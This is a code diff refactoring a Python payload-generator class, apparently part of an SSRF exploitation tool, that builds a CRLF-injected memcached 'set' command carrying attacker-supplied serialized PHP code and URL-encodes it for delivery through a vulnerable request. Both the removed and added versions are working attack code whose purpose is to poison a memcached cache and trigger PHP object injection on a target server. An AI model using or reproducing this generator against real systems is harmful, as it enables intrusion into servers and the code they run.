@@ -1,11 +1,12 @@
 from .base import *
+from .encoding import to_bytes
 
 class PHPMemcached(GENERATOR):
+    default_port = 11211
     requirement = ["code"]
-    def __init__(self, parser,options={}):
-        if options["port"] == 0:
-            options["port"] = 11211
-        super().__init__(parser,options)
+
+    def __init__(self, parser, options=None):
+        super().__init__(parser, options)
         self.set_requirement(self.requirement)
         arg = self.get_requirement()
         if arg.code == "":
@@ -15,15 +16,9 @@ class PHPMemcached(GENERATOR):
 
     def generate(self):
         code = self.code 
-        payload = "%0d%0aset SpyD3r 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"
-        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).\
-            set_payload().\
-            replace("+", "%20").\
-            replace("%2F", "/").\
-            replace("%25", "%").\
-            replace("%3A", ":").\
-            prefix("%0d%0a").\
-            suffix("%0d%0a")
+        payload = "set SpyD3r 4 0 " + str(len(to_bytes(code))) + "\r\n" + code + "\r\n"
+        self.set_url_payload(payload).\
+            prefix("%0d%0a")
         return super().generate()
 
     def wizard(self):
